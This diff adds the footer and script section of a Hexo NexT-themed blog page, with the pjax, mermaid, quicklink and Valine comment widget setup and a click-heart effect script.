+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">31k</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout : 3000,
+        priority: true,
+        ignores : [uri => uri.includes('#'),uri => uri === 'http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/',]
+      });
+      });
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'vJBnfwjYMHBKxnV7r9DoXgRv-gzGzoHsz',
+      appKey     : 'QLEYMJRbky2OyJQ3zBaoPBMF',
+      placeholder: "说些什么？",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '50' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+<!--/*  
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+*/
+-->
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
